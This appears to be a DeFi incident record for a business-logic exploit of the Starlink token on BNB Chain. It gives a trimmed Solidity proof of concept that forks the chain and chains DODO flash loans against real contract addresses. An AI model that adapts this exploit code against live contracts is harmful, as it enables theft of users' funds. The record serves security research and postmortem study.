# [?] - Starlink - Business Logic Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Starlink
Published: 2023-02-17
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Starlink_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$12k
References:
- https://twitter.com/NumenAlert/status/1626447469361102850
- https://twitter.com/bbbb/status/1626392605264351235
- https://bscscan.com/tx/0x146586f05a4513136deab3557ad15df8f77ffbcdbd0dd0724bc66dbeab98a962

```solidity
contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 Starlink = IERC20(0x518281F34dbf5B76e6cdd3908a6972E8EC49e345);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x425444dA1410940CFdfB6A980Bd16aA7a5376d6D);
    address dodo1 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    address dodo2 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address dodo3 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    uint256 dodoFlashAmount1;
    uint256 dodoFlashAmount2;
    uint256 dodoFlashAmount3;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 25_729_304);
    }

    function testExploit() public {
        dodoFlashAmount1 = WBNB.balanceOf(dodo1);
        DVM(dodo1).flashLoan(dodoFlashAmount1, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == dodo1) {
            dodoFlashAmount2 = WBNB.balanceOf(dodo2);
            DVM(dodo2).flashLoan(dodoFlashAmount2, 0, address(this), new bytes(1));
            WBNB.transfer(dodo1, dodoFlashAmount1);
        } else if (msg.sender == dodo2) {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Starlink_exp.sol_
